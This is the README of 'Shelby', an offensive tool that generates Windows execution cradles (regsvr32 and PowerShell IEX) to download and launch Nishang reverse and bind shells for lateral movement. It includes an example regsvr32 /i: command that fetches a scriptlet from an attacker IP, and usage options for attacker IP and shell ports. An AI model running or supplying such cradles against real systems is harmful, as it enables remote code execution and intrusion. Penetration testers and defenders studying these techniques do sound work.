<p align="center">
  <img alt="By Order of the Peaky Blinders" src="https://i.imgur.com/5n0ly8K.png" height="140"/>
  <p align="center">
    <a href="https://github.com/ad-995/shelby/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/ad-995/shelby.svg?style=flat-square"></a>
    <a href="https://github.com/ad-995/shelby/blob/master/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat-square"></a>
    <a href="https://github.com/ad-995/shelby/issues"><img alt="GitHub issues" src="https://img.shields.io/github/issues/ad-995/shelby.svg?style=flat-square"></a>
    </p>
</p>

<h5 align="center"><i>Execution Cradle Generation!</i></h5>

***

## Introduction

`Shelby` is a Windows Execution Cradle Generator inspired by [PoshC2](https://github.com/nettitude/PoshC2/blob/master/poshc2/server/Payloads.py) and their `PoshC2_Project/quickstart.txt` documentation. 

The aim of this project is to automatically generate several commonly used Execution Cradles for lateral movement. Future releases will include some classic Linux cradles too.

## Cradles
For our initial proof-o'-concept, we have two cradles:
- `regsvr32`
- `powershell IEX (...)`

These can be run with any command execution. When `Shelby` is run, the provided snippets will update with the given IP address and port and are available in plaintext and base64-encoded.

## Shells
Two shells are currently inside `Shelby`, both from [Nishang](https://github.com/samratashok/nishang). We found these to be more reliable:
- [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- [Invoke-PowerShellTcpOneLineBind](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1)

Additional shells for Windows and Linux coming soon!

## Modularity
See the [wiki](https://github.com/ad-995/shelby/wiki) for adding to `shelby`!

## Example
Below is an example output:
![Shelby Output](https://i.imgur.com/G0XRmTS.png)

## Usage
```
usage: shelby.py [-h] [-i 127.0.0.1] [-p 4444] [-s 80] [-C cradles]
                 [-D resources] [-S keys] [--linux] [--windows]
                 [--randomize-names] [--version]

Giver of shells

optional arguments:
  -h, --help            show this help message and exit
  -i 127.0.0.1, --ip-address 127.0.0.1
                        Attacker IP Address
  -p 4444, --shell-port 4444
                        Port for receiving shells
  -s 80, --server-port 80
                        Port for serving shells
  -C cradles, --cradle-directory cradles
                        Directory for generated payloads
  -D resources, --resource-directory resources
                        Directory for shell resources
  -S keys, --ssh-directory keys
                        Directory for SSH Keys
  --linux               Only Linux shells
  --windows             Only Windows shells
  --randomize-names     Rename retrieved-shells to random string
  --version             Print current version
```

There are some important things to note here:
- `--ip-address`: The IP address that the `shells` will call back to.
- `--cradle-port`: The port that the `shells` will call back to.
- `--web-delivery`: The port that the `cradles` will use to retrieve the `shell`.
- `--directory`: The directory in which all the `cradles` and `shells` will be saved to, as well as the `cradle_commands.txt` file. You should run your web delivery server here.

The `cradle_commands.txt` file contains all the Execution Cradle commands. For example:

```
regsvr32:
regsvr32 /s /n /u /i:http://10.10.11.58:80/sctlvjzqylbdzdl scrobj.dll
```

As more Execution Cradles are added, the format will be the same:

```
Method:
Cradle Command
```

Finally, the easiest usecase here is to serve the `./server_port` directory with `python -m SimpleHTTPServer 80`. 

A project by [mez-0](https://github.com/mez-0) & [michaelranaldo](https://github.com/michaelranaldo)
